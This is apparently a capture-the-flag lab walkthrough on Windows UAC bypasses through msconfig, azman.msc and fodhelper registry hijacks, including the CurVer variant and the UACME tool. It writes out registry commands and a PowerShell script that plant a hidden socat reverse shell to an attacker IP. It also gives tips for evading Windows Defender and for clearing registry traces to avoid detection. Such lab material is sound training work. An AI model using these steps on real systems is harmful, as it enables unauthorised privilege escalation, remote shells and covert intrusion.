We will start by looking at GUI-based bypasses, as they provide an easy way to understand the basic concepts involved. These examples are not usually applicable to real-world scenarios, as they rely on us having access to a graphical session, from where we could use the standard UAC to elevate.

Click the Start Lab Machine button to deploy your VM and connect to it via RDP or in the side by side view in Browser:

xfreerdp /v:10.128.163.98 /u:attacker /p:Password321

This machine will be used for all tasks in the room.



Case study: msconfig
Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:


If we analyze the msconfig process with Process Hacker (available on your desktop), we notice something interesting. Even when no UAC prompt was presented to us, msconfig runs as a high IL process:



This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. More details on this later.

If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:



If we click Launch, we will obtain a high IL command prompt without interacting with UAC in any way.

To retrieve the msconfig flag, use the obtained high integrity console to execute:

Administrator: Command Prompt
C:\> C:\flags\GetFlag-msconfig.exe

Case study: azman.msc

As with msconfig, azman.msc will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.

First, let's run azman.msc:



We can confirm that a process with high IL was spawned by using Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):



To run a shell, we will abuse the application's help:



On the help screen, we will right-click any part of the help article and select View Source:



This will spawn a notepad process that we can leverage to get a shell. To do so, go to File->Open and make sure to select All Files in the combo box on the lower right corner. Go to C:\Windows\System32 and search for cmd.exe and right-click to select Open:



This will once again bypass UAC and give us access to a high integrity command prompt. You can check the process tree in Process Hacker to see how the high integrity token is passed from mmc (Microsoft Management Console, launched through the Azman), all the way to cmd.exe:



To retrieve the azman flag, use the obtained high integrity console to execute:

Administrator: Command Prompt
C:\> C:\flags\GetFlag-azman.exe




One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.

To connect to the backdoor, you can use the following command:

nc 10.128.161.56 9999
Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:

Attacker's Shell
user@kali$ nc 10.128.161.56 9999
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
myserver\attacker

C:\Windows\system32>net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users                

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of socat can be found on c:\tools\socat\. You can use the following commands to set the required registry keys from a standard command line:

Command Prompt
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
Notice how we need to create an empty value called DelegateExecute for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.

We set up a listener by using netcat in our machine:

nc -lvp 4444

And then proceed to execute fodhelper.exe, which in turn will trigger the execution of our reverse shell:

Command Prompt
C:\> fodhelper.exe








➜	
Attacker's Shell
user@kali$ nc -lvp 4444      
Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
The received shell runs with high integrity, indicating we have successfully bypassed UAC.

To retrieve the fodhelper flag, use your new shell to execute:

Administrator: Command Prompt
C:\> C:\flags\GetFlag-fodhelper.exe
Note: Keep in mind that the flag will only be returned if you successfully bypassed UAC via fodhelper and only from the resulting high integrity shell.



Clearing our tracks
As a result of executing this exploit, some artefacts were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command:

reg delete HKCU\Software\Classes\ms-settings\ /f
Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks.




Improving the fodhelper exploit
A variation on the fodhelper exploit was proposed by @V3ded(opens in new tab), where different registry keys are used, but the basic principle is the same.

Instead of writing our payload into HKCU\Software\Classes\ms-settings\Shell\Open\command, we will use the CurVer entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows you to point to the default version of the application to be used by Windows when opening a given file type.

To this end, we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.

The exploit code proposed by @V3ded uses Powershell to achieve this end. Here is a modified version of it adapted to use our reverse shell (be sure to replace your IP address where needed):

$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
This exploit creates a new progID with the name .pwn and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our .pwn progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command.

This technique is more likely to evade Windows Defender since we have more liberty on where to put our payload, as the name of the progID that holds our payload is entirely arbitrary. Let's start a new reverse shell on our attacker's machine:

nc -lvp 4445
And execute the exploit from our backdoor connection as is. As a result, Windows Defender will throw another alert that references our actions:



Although we are still detected, it is essential to note that sometimes the detection methods used by AV software are implemented strictly against the published exploit, without considering possible variations. If we translate our exploit from Powershell to use cmd.exe, the AV won't raise any alerts (be sure to replace your IP address where needed):

Command Prompt
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
And we get a high integrity reverse shell:

Attacker's Shell
user@kali$ nc -lvp 4445      
Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
To retrieve the fodhelper-curver flag, use your new shell to execute:

Administrator: Command Prompt
C:\> C:\flags\GetFlag-fodhelper-curver.exe
Note: Keep in mind that the flag will only be returned if you successfully bypassed UAC via fodhelper and only from the resulting high integrity shell via socat.



Clearing our tracks
As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following commands:

reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
Note: Be sure to execute the given commands to avoid any artefact interfering with the following tasks.




Automating UAC Bypasses
An excellent tool is available to test for UAC bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up to date repository of UAC bypass techniques that can be used out of the box. The tool is available for download at its official repository on:

https://github.com/hfiref0x/UACME(opens in new tab)

While UACME provides several tools, we will focus mainly on the one called Akagi, which runs the actual UAC bypasses. You can find a compiled version of Akagi under C:\tools\UACME-Akagi64.exe.

Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

Command Prompt
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker>cd /tools

C:\tools>UACME-Akagi64.exe 33
The methods introduced through this room can also be tested by UACME by using the following methods:

Method Id	Bypass technique
33	fodhelper.exe
34	DiskCleanup scheduled task
70	fodhelper.exe using CurVer registry key
